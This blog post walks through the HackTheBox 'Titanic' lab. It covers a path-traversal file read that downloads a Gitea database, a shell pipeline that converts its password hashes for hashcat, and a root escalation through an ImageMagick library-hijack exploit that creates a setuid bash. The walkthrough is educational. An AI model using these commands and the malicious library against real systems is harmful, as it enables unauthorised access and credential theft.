---
layout: post
title: Titanic
date: 2025-06-22 00:34:00 +0800
categories: [HackTheBox, Easy]
tags: [Linux,Apache,Gitea,Docker,magick,CVE-2024-41817]
author: klein
image:
  path: /images/images-titanic/image_25.png
  
---


As always let's start with an nmap scan. 

```
──(root㉿kali)-[/home/kali/HTB/Titanic]
└─# nmap --min-rate 10000 10.129.217.164
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-22 09:37 EDT
Nmap scan report for 10.129.217.164
Host is up (0.062s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```


After finding out what ports are open on the target machine I am going to do a scan on those ports to determine service/version information.

```
┌──(root㉿kali)-[/home/kali/HTB/Titanic]
└─# nmap -p 22,80 -sCV 10.129.217.164
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-22 09:38 EDT
Nmap scan report for 10.129.217.164
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
![b](/images/images-titanic/image_01.png)

Based on the output it can be determined that the target is Ubuntu and also that port 80 is redirecting to titanic.htb. Let's add this to the /etc/hosts file.

```
vim /etc/hosts
```

While enumerating the website by clicking around I am going to start ffuf to fuzz for any subdomains.

```
ffuf -u http://10.129.217.164 -H "Host: FUZZ.titanic.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

This gave back "dev", let's add this as well to the /etc/hosts file.

By clicking around on the titanic.htb page the only responsive part is the "Book Your Trip" button.

![b](/images/images-titanic/image_02.png)

By sending a booking request and paying attention to the Network tab in developer tools many important pieces of information are visible. For example, the site is running Werkzeug Python.

![b](/images/images-titanic/image_03.png)

Also wanted to look at what kind of pages am I looking at, by the error message and with the help of Wappalyzer it is determined, that this is Flask.

![b](/images/images-titanic/image_04.png)


For enumerating any additional direcotries I ran feroxbuster.
```
feroxbuster -u http://titanic.htb
```
This gave back nothing significant that I could use to progress further.
![b](/images/images-titanic/image_05.png)

Time to switch to the dev site, which is hosting Gitea.
![b](/images/images-titanic/image_06.png)

By clicking on the "Explore" tab, I found two repositories.

![b](/images/images-titanic/image_07.png)

The docker-config repository has two folders.

One of them shows a password and the other one where the Gitea data that lives on the host machine.

![b](/images/images-titanic/image_08.png)


![b](/images/images-titanic/image_09.png)

The flask-app repository also shows the source code of titanic.htb.

![b](/images/images-titanic/image_10.png)

The source code gives away a few things, for example:
- / returns the static page
- /book only accepts POST requests saves the data with a random UUID filename, and then returns a redirect to /downloads.

Let's break down a booking request into smaller pieces and take a closer look.

By sending a request it can be examined that first the application sends a POST request and after that redirects to the /download directory. Later it turned out this is a directory traversal/file read vulnerability.

![b](/images/images-titanic/image_11.png)

By reading the output the only user outside of root that has a shell set is the developer. So I read the user.txt file based on this opportunity.

![b](/images/images-titanic/image_12.png)

The docker-compose.yml file showed that there is a shared volume in the developer's home directory, this is going to help out with getting a shell as a user.

This path was: /home/developer/gitea/data

Using this path we can chain this information with the database info which leaks the path to the database.

![b](/images/images-titanic/image_13.png)

Using curl I downloaded the database.

```
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db
```
![b](/images/images-titanic/image_14.png)

In this database I found 2 long hashes, I used Google and found a method how to make a crackable hash from these strings.

![b](/images/images-titanic/image_15.png)

```
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```
![b](/images/images-titanic/image_16.png)

Copied these hashes to a file and used hashcat to crack them.

```
hashcat hashes.txt /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --user
```

This was successful and cracked the password for the developer user.

![b](/images/images-titanic/image_17.png)

From now on I can connect to the target machine via ssh and with the credentials.

```
ssh developer@titanic.htb
```
![b](/images/images-titanic/image_18.png)

The privilege escalation is a little bit harder because /proc is mounted with the hideid option set to invisible.

```
mount | grep "/proc "
```
![b](/images/images-titanic/image_19.png)

The privesc can be done by paying attention to the metadata.log file that is owned by root and is being written every minute.

![b](/images/images-titanic/image_20.png)

This is being done by a cron job that is running the following script.

![b](/images/images-titanic/image_21.png)

The target in this script is Image Magic. The version of Titanic is 7.1.1

![b](/images/images-titanic/image_22.png)

By doing a quick Google search it is easy to find a POC exploit for this version. I used one found on this GitHub page.

https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

So I ran the following code:
```
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
 system("cp /bin/bash /tmp/chr0nicler; chmod 6777 /tmp/chr0nicler");
 exit(0);
}
EOF
```
This loads the library which calls system("id") in its constructor.
After a minute or so the cron ran and my bash was there.

![b](/images/images-titanic/image_23.png)

After this, I can run the command with -p which gives a root shell.

![b](/images/images-titanic/image_24.png)